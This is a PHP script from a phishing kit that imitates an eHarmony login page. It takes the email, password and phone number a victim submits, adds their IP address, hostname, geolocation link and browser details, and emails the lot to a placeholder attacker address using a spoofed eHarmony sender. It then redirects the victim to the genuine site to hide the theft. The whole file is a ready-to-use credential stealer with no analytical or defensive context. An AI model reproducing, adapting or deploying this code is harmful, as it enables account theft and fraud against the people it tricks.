<?

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$port = $_SERVER['REMOTE_PORT'];
$date = date("D M d, Y g:i a");

$message .= "-----------e-Harmony L0gin-------------\n";
$message .= "E-mail: ".$_POST['j_username']."\n";
$message .= "Password: ".$_POST['j_password']."\n";
$message .= "Phone #: ".$_POST['j_number']."\n";
$message .= "--------SysTem InformaTion----------------\n";
$message .= "IP/PORT: $ip:$port |\n";
$message .= "HostName: $hostname\n";
$message .= "Location:- http://www.geoiptool.com/?IP=$ip -\n";
$timedate = $_POST['historys'];
$message .= "Date : $date\n";
$message .= "Browser: ".$user_agent."\n";
$message .= "------------| @rrustemHEKRI x @rrustemHEKRI_V2 |-----------\n";

$recipient = "YOUR-EMAIL";
$subject = "e-Harmony - | $ip |";
$from = "From: e-Harmony Login <support@eharmony.com>";

if (mail($recipient,$subject,$message,$from));
header("Location: https://www.eharmony.com/tour/");

?>